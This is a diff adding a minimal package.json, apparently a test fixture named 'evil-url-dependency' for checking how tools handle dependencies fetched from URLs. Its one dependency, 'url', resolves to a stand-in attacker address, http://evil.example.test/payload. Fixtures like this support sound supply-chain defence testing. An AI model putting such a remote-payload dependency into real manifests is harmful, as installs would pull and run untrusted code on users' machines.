@@ -1,0 +1,11 @@
+{
+  "name": "evil-url-dependency",
+  "version": "1.0.0",
+  "author": {
+    "name": "Jane Developer",
+    "url": "http://jane.example.test"
+  },
+  "dependencies": {
+    "url": "http://evil.example.test/payload"
+  }
+}
